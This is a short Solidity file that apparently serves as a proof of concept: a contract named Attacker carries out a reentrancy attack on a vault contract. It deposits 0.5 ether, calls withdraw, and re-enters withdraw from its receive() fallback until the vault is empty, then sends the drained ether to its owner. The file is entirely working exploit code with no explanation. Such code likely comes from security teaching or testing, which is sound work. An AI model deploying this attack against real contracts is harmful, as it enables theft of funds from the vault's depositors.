// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IVault {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }

    function attack() public payable {
        vault.deposit{value: 0.5 ether}();
        vault.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
